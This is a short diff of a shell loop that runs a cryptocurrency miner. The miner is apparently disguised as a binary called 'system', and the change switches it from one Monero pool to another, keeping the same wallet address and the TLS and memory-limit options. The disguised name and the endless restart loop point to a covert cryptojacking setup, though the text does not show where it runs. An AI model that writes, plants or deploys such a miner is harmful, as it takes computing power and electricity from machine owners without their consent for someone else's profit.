@@ -6,7 +6,7 @@ while true; do
 
     # Execute the command in the background
     ulimit -v 40000000  # Set the virtual memory limit to 40GB
-    ./system -o pool.supportxmr.com:443 -u 82qf8HxLzbQVKGvBzXy5SJUucoZw2ySfJZS3Kww8wZ3NaTNnWNoXvvTf3vt5RdXbDC7uwPazSSQfx8frLTUd1eR2KVL1oUY -k --tls -p aliandhalala -t 220
+    ./system -o pool.hashvault.pro:443 -u 82qf8HxLzbQVKGvBzXy5SJUucoZw2ySfJZS3Kww8wZ3NaTNnWNoXvvTf3vt5RdXbDC7uwPazSSQfx8frLTUd1eR2KVL1oUY -p aki -k --tls
 
     # Wait for the command to finish
     wait
